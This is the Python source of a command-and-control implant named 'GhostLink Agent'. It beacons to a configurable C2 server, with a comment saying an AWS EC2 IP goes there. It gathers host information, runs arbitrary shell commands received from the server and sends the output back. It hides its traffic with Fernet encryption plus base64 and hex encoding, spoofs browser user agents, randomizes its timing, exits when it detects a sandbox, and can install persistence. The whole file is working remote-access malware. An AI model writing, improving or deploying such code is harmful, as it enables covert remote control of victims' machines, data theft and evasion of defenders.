import requests
import subprocess
import time
import socket
import platform
import json
import base64
import os
import sys
from cryptography.fernet import Fernet

# Import enhanced modules
try:
    from utils import EncodingSchemes, EvasionTechniques, Utilities
    from persistence import PersistenceManager
except ImportError:
    print("[-] Enhanced modules not found, running in basic mode")

# Configuration
C2_SERVER = "http://127.0.0.1:8888"  # AWS EC2 IP yahan aayega
BEACON_INTERVAL = 10  # Every 10 seconds
ENCRYPTION_KEY = b"p-EVN8hYvMU8sH7pV0q6vF-YlK9pNxR5tQ2K8zM0GJQ="  # Must match server
AGENT_ID = "Agent_01"

# Headers to appear like normal browser traffic
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

# Enhanced configuration
ENABLE_PERSISTENCE = False
ENABLE_EVASION = True
ENCODING_SCHEME = "chain"  # base64, hex, rot13, chain (base64→hex), advanced
PROXY_SUPPORT = None  # {"http": "proxy_url", "https": "proxy_url"}

# Advanced encoding with multiple layers
USE_MULTILAYER_ENCODING = True  # Fernet + Base64 + Hex chain

def get_system_info():
    """Gather system information"""
    try:
        return {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "platform": platform.platform(),
            "user": os.environ.get("USER", "unknown"),
            "cwd": os.getcwd(),
            "python_version": platform.python_version()
        }
    except:
        return {"hostname": "unknown", "os": "unknown"}

def encrypt_data(data):
    """Encrypt data using Fernet (AES) + Advanced Encoding"""
    try:
        f = Fernet(ENCRYPTION_KEY)
        json_data = json.dumps(data)
        
        # Layer 1: Fernet encryption (AES-128)
        encrypted = f.encrypt(json_data.encode())
        
        # Layer 2: Apply encoding scheme
        if USE_MULTILAYER_ENCODING:
            # Multi-layer: Fernet → Base64 → Hex
            b64_encoded = base64.b64encode(encrypted).decode()
            final_payload = EncodingSchemes.hex_encode(b64_encoded)
            return final_payload
        else:
            # Single layer encoding
            if ENCODING_SCHEME == "base64":
                return base64.b64encode(encrypted).decode()
            elif ENCODING_SCHEME == "hex":
                return EncodingSchemes.hex_encode(encrypted.decode())
            elif ENCODING_SCHEME == "rot13":
                return EncodingSchemes.rot13_encode(base64.b64encode(encrypted).decode())
            elif ENCODING_SCHEME == "chain":
                b64 = base64.b64encode(encrypted).decode()
                return EncodingSchemes.hex_encode(b64)
            else:
                return base64.b64encode(encrypted).decode()
    except Exception as e:
        print(f"[-] Encryption error: {e}")
        return None

def decrypt_data(encrypted_data):
    """Decrypt data from server with advanced encoding support"""
    try:
        f = Fernet(ENCRYPTION_KEY)
        
        # Reverse multi-layer encoding if needed
        if USE_MULTILAYER_ENCODING:
            # Hex → Base64 → Fernet
            b64_decoded = EncodingSchemes.hex_decode(encrypted_data)
            encrypted = base64.b64decode(b64_decoded.encode())
        else:
            # Reverse single layer encoding
            if ENCODING_SCHEME == "base64":
                encrypted = base64.b64decode(encrypted_data.encode())
            elif ENCODING_SCHEME == "hex":
                encrypted = bytes.fromhex(encrypted_data)
            elif ENCODING_SCHEME == "rot13":
                decoded = EncodingSchemes.rot13_encode(encrypted_data)  # ROT13 is reversible
                encrypted = base64.b64decode(decoded.encode())
            elif ENCODING_SCHEME == "chain":
                b64_decoded = EncodingSchemes.hex_decode(encrypted_data)
                encrypted = base64.b64decode(b64_decoded.encode())
            else:
                encrypted = base64.b64decode(encrypted_data.encode())
        
        # Decrypt using Fernet
        decrypted = f.decrypt(encrypted)
        return json.loads(decrypted.decode())
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return None

def execute_command(command, timeout=10):
    """Execute shell command and return output"""
    try:
        if not command or command.strip() == "":
            return "No command provided"
        
        # Check for special commands
        if command.lower() == "persistence":
            return install_persistence()
        elif command.lower().startswith("persistence "):
            method = command.split(" ")[1]
            return install_persistence(method)
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        try:
            stdout, stderr = process.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            output = "[-] Command execution timeout"
        else:
            output = stdout + (stderr if stderr else "")
        
        return output if output else "[Command executed with no output]"
    
    except Exception as e:
        return f"[-] Command execution error: {str(e)}"

def install_persistence(method="auto"):
    """Install persistence mechanism"""
    try:
        pm = PersistenceManager()
        
        # Get implant path
        implant_path = os.path.abspath(__file__)
        
        result = pm.install_persistence(implant_path, method)
        
        return json.dumps(result, indent=2)
    except Exception as e:
        return f"[-] Persistence error: {str(e)}"

def randomize_headers():
    """Randomize headers for evasion"""
    if ENABLE_EVASION:
        headers = HEADERS.copy()
        headers["User-Agent"] = EvasionTechniques.generate_random_useragent()
        return headers
    return HEADERS

def get_beacon_interval():
    """Get randomized beacon interval for evasion"""
    if ENABLE_EVASION:
        return EvasionTechniques.randomize_beacon_interval(BEACON_INTERVAL, variance=3)
    return BEACON_INTERVAL

def beacon():
    """Send beacon to C2 server and check for commands"""
    try:
        # Gather system info
        sys_info = get_system_info()
        
        # Create beacon payload
        beacon_data = {
            "agent_id": AGENT_ID,
            "hostname": sys_info["hostname"],
            "os": sys_info["os"],
            "timestamp": time.time()
        }
        
        # Encrypt payload
        encrypted_payload = encrypt_data(beacon_data)
        
        if not encrypted_payload:
            return False
        
        # Send beacon to server with randomized headers
        payload = {"payload": encrypted_payload}
        headers = randomize_headers()
        
        # Support for proxy
        proxies = PROXY_SUPPORT if PROXY_SUPPORT else None
        
        response = requests.post(
            f"{C2_SERVER}/beacon",
            json=payload,
            headers=headers,
            timeout=5,
            proxies=proxies
        )
        
        if response.status_code != 200:
            print(f"[-] Beacon failed with status {response.status_code}")
            return False
        
        # Decrypt server response
        server_response = response.json()
        decrypted_response = decrypt_data(server_response.get("payload"))
        
        if not decrypted_response:
            return False
        
        print(f"[+] Beacon successful. Status: {decrypted_response.get('status')}")
        
        # Check if there's a command to execute
        command = decrypted_response.get("command")
        cmd_id = decrypted_response.get("cmd_id")
        
        if command:
            print(f"[+] Received command: {command}")
            output = execute_command(command)
            
            # Apply evasion techniques to output
            if ENABLE_EVASION:
                output = EvasionTechniques.hide_command_output(output, max_lines=100)
            
            print(f"[+] Command output:\n{output}")
            
            # Send result back to server
            result_data = {
                "agent_id": AGENT_ID,
                "cmd_id": cmd_id,
                "output": output,
                "timestamp": time.time()
            }
            
            encrypted_result = encrypt_data(result_data)
            result_payload = {"payload": encrypted_result}
            headers = randomize_headers()
            
            try:
                result_response = requests.post(
                    f"{C2_SERVER}/result",
                    json=result_payload,
                    headers=headers,
                    timeout=5,
                    proxies=proxies
                )
                print(f"[+] Result sent to server")
            except Exception as e:
                print(f"[-] Failed to send result: {e}")
        
        return True
    
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed to {C2_SERVER}")
        return False
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return False

def main():
    """Main agent loop"""
    print("[*] GhostLink Agent Starting...")
    print(f"[*] Agent ID: {AGENT_ID}")
    print(f"[*] C2 Server: {C2_SERVER}")
    print(f"[*] Beacon Interval: {BEACON_INTERVAL} seconds")
    print(f"[*] Evasion Enabled: {ENABLE_EVASION}")
    print(f"[*] Persistence Enabled: {ENABLE_PERSISTENCE}")
    
    # Check for sandbox (if evasion enabled)
    if ENABLE_EVASION:
        if EvasionTechniques.detect_sandboxed_environment():
            print("[!] Sandbox detected, exiting...")
            return
    
    # Install persistence on startup (if enabled)
    if ENABLE_PERSISTENCE:
        print("[*] Installing persistence...")
        install_persistence()
    
    connection_failures = 0
    
    while True:
        try:
            success = beacon()
            
            if success:
                connection_failures = 0
            else:
                connection_failures += 1
            
            # If 5 consecutive failures, wait longer before retry
            if connection_failures >= 5:
                print(f"[!] Too many failures, waiting 60 seconds before retry...")
                time.sleep(60)
            else:
                interval = get_beacon_interval()
                time.sleep(interval)
        
        except KeyboardInterrupt:
            print("\n[*] Agent shutting down...")
            break
        except Exception as e:
            print(f"[-] Main loop error: {e}")
            interval = get_beacon_interval()
            time.sleep(interval)

if __name__ == "__main__":
    main()
    